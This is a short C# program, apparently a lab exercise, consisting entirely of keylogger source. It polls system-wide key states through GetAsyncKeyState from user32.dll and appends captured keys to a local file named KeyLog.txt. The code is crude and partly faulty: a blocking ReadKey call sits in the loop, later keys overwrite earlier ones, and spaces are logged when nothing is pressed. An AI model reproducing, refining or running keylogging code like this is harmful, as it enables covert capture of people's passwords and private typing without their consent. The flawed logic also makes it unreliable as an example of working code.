using System;
using System.IO;
using System.Runtime.InteropServices;

namespace LR_4_1
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        
        static void Main()
        {
            while (true)
            {
                StreamWriter f = new StreamWriter("KeyLog.txt", true);
                char key = ' ';
                for (int i = 8; i < 190; i++)
                {
                    if (GetAsyncKeyState(i) != 0)
                    {
                        key = (char) i;
                    }
                }
                f.Write(key);
                Console.ReadKey();
                f.Close();
            }
        }
    }
}
